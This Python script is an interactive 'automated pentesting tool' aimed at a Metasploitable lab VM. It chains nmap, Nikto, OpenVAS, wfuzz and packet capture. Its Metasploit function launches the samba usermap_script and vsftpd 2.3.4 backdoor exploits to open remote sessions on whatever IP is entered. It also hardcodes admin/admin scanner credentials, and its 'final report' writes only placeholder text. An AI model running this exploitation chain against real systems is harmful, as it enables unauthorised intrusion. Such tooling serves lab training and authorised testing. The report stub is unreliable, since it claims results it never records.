#!/usr/bin/env python3

import nmap
import subprocess
import sys
import time
import gvm
from gvm.protocols.latest import Gmp
from gvm.transforms import EtreeTransform
from gvm.xml import pretty_print
from colorama import Fore, Style, init

init(autoreset=True)

def print_banner():
    banner = """
    ╔═══════════════════════════════════════════════╗
    ║                                               ║
    ║   Advanced Automated Pentesting Tool          ║
    ║   for Metasploitable                          ║
    ║                                               ║
    ╚═══════════════════════════════════════════════╝
    """
    print(Fore.CYAN + banner)

def get_target_ip():
    while True:
        target_ip = input(Fore.YELLOW + "Enter the Metasploitable VM IP address: ")
        if is_valid_ip(target_ip):
            return target_ip
        print(Fore.RED + "Invalid IP address. Please try again.")

def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

def advanced_port_scan(target_ip):
    print(Fore.GREEN + "\n[+] Running advanced port scan...")
    nm = nmap.PortScanner()
    nm.scan(target_ip, arguments='-sS -sU -T4 -A -v -p-')
    
    for host in nm.all_hosts():
        print(f"\nHost : {host} ({nm[host].hostname()})")
        print(f"State : {nm[host].state()}")
        
        for proto in nm[host].all_protocols():
            print(f"\nProtocol : {proto}")
            ports = nm[host][proto].keys()
            for port in ports:
                print(f"Port : {port}\tState : {nm[host][proto][port]['state']}\tService : {nm[host][proto][port]['name']}")
                if 'script' in nm[host][proto][port]:
                    print(f"Script output:\n{nm[host][proto][port]['script']}")

def run_nikto_scan(target_ip):
    print(Fore.GREEN + "\n[+] Running Nikto web server scan...")
    nikto_command = f"nikto -h {target_ip}"
    process = subprocess.Popen(nikto_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    print(Fore.CYAN + stdout.decode())

def run_openvas_scan(target_ip):
    print(Fore.GREEN + "\n[+] Running OpenVAS vulnerability scan...")
    try:
        connection = gvm.connections.TLSConnection(hostname='localhost')
        with Gmp(connection) as gmp:
            gmp.authenticate('admin', 'admin')
            
            # Create a target
            target_id = gmp.create_target(name=f"Scan {target_ip}", hosts=[target_ip])
            
            # Create a task
            task_id = gmp.create_task(name=f"Scan Task for {target_ip}", config_id='daba56c8-73ec-11df-a475-002264764cea', target_id=target_id)
            
            # Start the scan
            report_id = gmp.start_task(task_id)
            
            # Wait for the scan to complete
            while gmp.get_task(task_id)['status'] != 'Done':
                time.sleep(10)
            
            # Get the results
            report = gmp.get_report(report_id)
            
            print(Fore.CYAN + "Vulnerabilities found:")
            for result in report['report']['results']['result']:
                print(f"- {result['name']} (Severity: {result['severity']})")
    except Exception as e:
        print(Fore.RED + f"Error running OpenVAS scan: {str(e)}")

def web_fuzzing(target_ip):
    print(Fore.GREEN + "\n[+] Running web application fuzzing...")
    wordlist = "/usr/share/wordlists/dirb/common.txt"
    fuzz_command = f"wfuzz -c -z file,{wordlist} --hc 404 http://{target_ip}/FUZZ"
    process = subprocess.Popen(fuzz_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    print(Fore.CYAN + stdout.decode())

def metasploit_exploit(target_ip):
    print(Fore.GREEN + "\n[+] Attempting automated exploitation with Metasploit...")
    msfconsole_command = f"""msfconsole -q -x "use exploit/multi/samba/usermap_script;
set RHOSTS {target_ip};
set LHOST $(hostname -I | awk '{{print $1}}');
exploit -j;
use exploit/unix/ftp/vsftpd_234_backdoor;
set RHOSTS {target_ip};
exploit -j;
sessions -l;
exit"
"""
    process = subprocess.Popen(msfconsole_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    print(Fore.CYAN + stdout.decode())

def capture_traffic(target_ip, duration=60):
    print(Fore.GREEN + f"\n[+] Capturing network traffic for {duration} seconds...")
    capture_command = f"tcpdump -i eth0 host {target_ip} -w capture.pcap"
    process = subprocess.Popen(capture_command, shell=True)
    time.sleep(duration)
    process.terminate()
    
    print(Fore.CYAN + "Traffic capture complete. Analyzing...")
    analysis_command = "tshark -r capture.pcap -q -z io,phs"
    process = subprocess.Popen(analysis_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    print(Fore.CYAN + stdout.decode())

def generate_report(target_ip):
    print(Fore.GREEN + "\n[+] Generating final report...")
    report = f"""
    =======================================
    Advanced Automated Pentest Report for {target_ip}
    =======================================

    1. Advanced Port Scan Results:
    ------------------------------
    [Advanced port scan results would be inserted here]

    2. Nikto Web Server Scan:
    -------------------------
    [Nikto scan results would be inserted here]

    3. OpenVAS Vulnerability Scan:
    ------------------------------
    [OpenVAS scan results would be inserted here]

    4. Web Application Fuzzing Results:
    -----------------------------------
    [Web fuzzing results would be inserted here]

    5. Metasploit Exploitation Attempts:
    ------------------------------------
    [Metasploit exploitation results would be inserted here]

    6. Network Traffic Analysis:
    ----------------------------
    [Traffic analysis results would be inserted here]

    7. Recommendations:
    -------------------
    - Update all services to their latest versions
    - Disable unnecessary services
    - Implement strong authentication mechanisms
    - Apply security patches regularly
    - Implement network segmentation
    - Use intrusion detection/prevention systems
    - Conduct regular security assessments

    =======================================
    End of Report
    =======================================
    """
    
    with open("advanced_pentest_report.txt", "w") as f:
        f.write(report)
    
    print(Fore.GREEN + "Report generated and saved as 'advanced_pentest_report.txt'")

def main_menu():
    target_ip = get_target_ip()
    
    while True:
        print_banner()
        print(Fore.YELLOW + "\nMain Menu:")
        print("1. Run Advanced Port Scan")
        print("2. Run Nikto Web Server Scan")
        print("3. Run OpenVAS Vulnerability Scan")
        print("4. Perform Web Application Fuzzing")
        print("5. Attempt Automated Exploitation")
        print("6. Capture and Analyze Network Traffic")
        print("7. Generate Final Report")
        print("8. Exit")
        
        choice = input(Fore.YELLOW + "\nEnter your choice (1-8): ")
        
        if choice == '1':
            advanced_port_scan(target_ip)
        elif choice == '2':
            run_nikto_scan(target_ip)
        elif choice == '3':
            run_openvas_scan(target_ip)
        elif choice == '4':
            web_fuzzing(target_ip)
        elif choice == '5':
            metasploit_exploit(target_ip)
        elif choice == '6':
            capture_traffic(target_ip)
        elif choice == '7':
            generate_report(target_ip)
        elif choice == '8':
            print(Fore.GREEN + "Thank you for using the Advanced Automated Pentesting Tool. Goodbye!")
            sys.exit(0)
        else:
            print(Fore.RED + "Invalid choice. Please try again.")
        
        input(Fore.YELLOW + "\nPress Enter to continue...")

if __name__ == "__main__":
    main_menu()